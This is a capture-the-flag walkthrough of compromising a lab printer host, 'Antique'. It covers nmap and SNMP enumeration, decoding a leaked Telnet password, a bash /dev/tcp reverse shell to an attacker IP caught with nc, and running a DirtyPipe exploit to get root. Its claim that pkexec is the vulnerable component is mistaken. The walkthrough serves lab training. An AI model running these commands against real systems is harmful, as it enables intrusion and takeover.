I can run nmap to discover open ports and find vulnerabilities. I find an open port 23 and its service is Telnet.

![alt text](/image/antique1.png)

 I run the Telnet command with the IP address and it asks for a password.

![alt text](/image/antique2.png)

I don´t know the password. I searched online for HP JetDirect credentials and nothing works

![alt text](/image/antique3.png)

I tried to run nmap command again to investigate open UDP ports.

![alt text](/image/antique4.png)

I used the snmpwalk command to browse the SNMP tree of the device. 

![alt text](/image/antique5.png)

This information can be used to decode and find the password.

```sh
echo " 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
```

![alt text](/image/antique6.png) 

I executed a reverse shell used bash.

```sh
exec ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.60.136  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:a594  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:a594  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:a5:94  txqueuelen 1000  (Ethernet)
        RX packets 734227  bytes 52440899 (52.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11223  bytes 763564 (763.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

> exec bash -c "bash -i &> /dev/tcp/10.10.15.34/443 0>&1"
```

I got the user.txt

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.15.34] from (UNKNOWN) [10.129.60.136] 43398
bash: cannot set terminal process group (1146): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$  python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
lp@antique:~$ ls
ls
telnet.py  user.txt
lp@antique:~$ cat user.txt
cat user.txt
```

Now I use the find command to privileges enumeration 

```sh
cd /
lp@antique:/$ find \-perm -4000 2>/dev/null
find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/authbind/helper
./usr/bin/mount
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/passwd
./usr/bin/fusermount
./usr/bin/chsh
./usr/bin/at
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/su
```

I investigated and found that there are vulnerabilities in pkexec.

https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

```sh
lp@antique:/tmp$ nano privesec.c
lp@antique:/tmp$ gcc privesec.c -o privesec
lp@antique:/tmp$ ls
privesec                                                                           tmp.g25BrErsOd
privesec.c                                                                         tmp.tVbd5HYLIl
systemd-private-0298fdf5c424430da410b50a7d0b9ab1-systemd-logind.service-NQuT9h     tmp.Yap3oVdLQO
systemd-private-0298fdf5c424430da410b50a7d0b9ab1-systemd-timesyncd.service-YBVY9h  vmware-root_888-2730562489
lp@antique:/tmp$ ./privesec.c
bash: ./privesec.c: Permission denied
lp@antique:/tmp$ chmod +x privesec.c
lp@antique:/tmp$ ./privesc
bash: ./privesc: No such file or directory
lp@antique:/tmp$ ./privesec
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
whoami
root
cat /root/root.txt
```


